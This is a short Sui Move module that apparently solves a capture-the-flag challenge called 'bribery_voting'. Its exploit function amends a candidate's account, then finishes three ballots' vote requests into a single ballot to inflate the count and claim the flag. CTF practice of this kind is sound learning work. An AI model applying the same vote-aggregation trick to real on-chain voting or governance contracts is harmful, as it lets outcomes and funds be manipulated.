// PackageID: 0x0143395bf3c44b39540af68983cdfd040a37babf49479fc1f7cd0e8fec71f68c
module solve_week3::solve_week3 {
    use std::string::String;

    use bribery_voting::briber::{Briber, get_flag, required_candidate};
    use bribery_voting::ballot::{Ballot, get_ballot, finish_voting};
    use bribery_voting::candidate::{Candidate, register, amend_account, vote};

    public fun create_ballots_and_register_candidate(ctx: &mut TxContext) {
        // create three ballots
        let _ = get_ballot(ctx);
        let _ = get_ballot(ctx);
        let _ = get_ballot(ctx);

        // register candidate
        register(ctx);
    }

    public fun exploit(
        briber: &mut Briber,
        candiate: &mut Candidate, 
        ballot1: &mut Ballot, 
        ballot2: &mut Ballot, 
        ballot3: &mut Ballot,
        github_id: String,
        ctx: &mut TxContext
    ) {
        // amend candidate's account
        let account = required_candidate();
        amend_account(candiate, account);

        // create vote requests
        let mut req1 = ballot1.request_vote();
        let mut req2 = ballot2.request_vote();
        let mut req3 = ballot3.request_vote();

        // vote with each request
        vote(candiate, &mut req1, 10);
        vote(candiate, &mut req2, 10);
        vote(candiate, &mut req3, 10);

        // finish voting into ballot1
        finish_voting(ballot1, req1);
        finish_voting(ballot1, req2);
        finish_voting(ballot1, req3);

        get_flag(briber, ballot1, github_id, ctx);
    }
}